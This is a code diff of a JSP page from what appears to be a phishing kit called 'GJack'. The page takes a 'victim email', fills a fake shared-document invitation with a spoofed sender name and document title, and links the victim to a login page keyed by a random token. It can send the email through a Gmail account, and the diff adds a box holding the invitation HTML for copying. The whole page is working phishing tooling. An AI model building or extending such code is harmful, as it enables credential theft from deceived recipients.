@@ -10,6 +10,9 @@
 <%@ page import="java.sql.SQLException" %>
 <html>
 <head>
+    <%
+        final String key = RandomString.get(10);
+    %>
     <title>GJack</title>
     <link rel="shortcut icon" href="favicon.ico">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -23,15 +26,19 @@
             //Setting default values
             $("a#a_shared_by").html('<%=Orders.DEFAULT_SHARED_BY%>');
             $("a#a_doc_title").html('<%=Orders.DEFAULT_DOC_TITLE%>');
+            $("a.order_link").attr('href', '/login.jsp?order_key=<%=key%>');
+
 
             $(".input_listener").on('keyup', function () {
                 $($(this).data("target")).text($(this).val());
+                $("textarea#invitationCode").text($("div#email_template").html().trim());
             });
 
             $("input#enable_sender_gmail").change(function () {
                 $("input.gmail_credentials").prop('disabled', !this.checked);
             });
 
+            $("textarea#invitationCode").text($("div#email_template").html().trim());
 
         });
 
@@ -50,10 +57,7 @@
         try {
             final Form form = new Form(request, new String[]{
                     Orders.COLUMN_VICTIM_EMAIL,
-                    Orders.COLUMN_USER_EMAIL/*
-                    Orders.COLUMN_SHARED_BY,
-                    Orders.COLUMN_DOC_TITLE,
-                    Orders.COLUMN_DOC_URL,*/
+                    Orders.COLUMN_USER_EMAIL
             });
             if (form.isSubmitted()) {
 
@@ -74,14 +78,12 @@
                 final String victimEmail = form.getString(Orders.COLUMN_VICTIM_EMAIL);
                 final String userEmail = form.getString(Orders.COLUMN_USER_EMAIL);
 
-                final String key = RandomString.get(10);
                 final String sharedBy = form.getString(Orders.COLUMN_SHARED_BY, Orders.DEFAULT_SHARED_BY);
                 final String docTitle = form.getString(Orders.COLUMN_DOC_TITLE, Orders.DEFAULT_DOC_TITLE);
                 final String docUrl = form.getString(Orders.COLUMN_DOC_URL, Orders.DEFAULT_DOC_URL);
 
                 final String gmailUsername = form.getString(Orders.KEY_SENDER_GMAIL_USERNAME, SecretConstants.GMAIL_USERNAME);
                 final String gmailPassword = form.getString(Orders.KEY_SENDER_GMAIL_PASSWORD, SecretConstants.GMAIL_PASSWORD);
-
 
                 final String content = EmailTemplates.getInvitation(key, sharedBy, docTitle);
 
@@ -188,7 +190,15 @@
         </div>
 
         <div class="col-md-8">
-            <%@include file="invitation.jsp" %>
+
+            <div id="email_template">
+                <%=EmailTemplates.INVITATION_HTML%>
+            </div>
+
+            <label for="invitationCode">Code:</label>
+            <textarea style="height: 255px;" id="invitationCode" class="form-control">
+
+            </textarea>
         </div>
 
     </div>
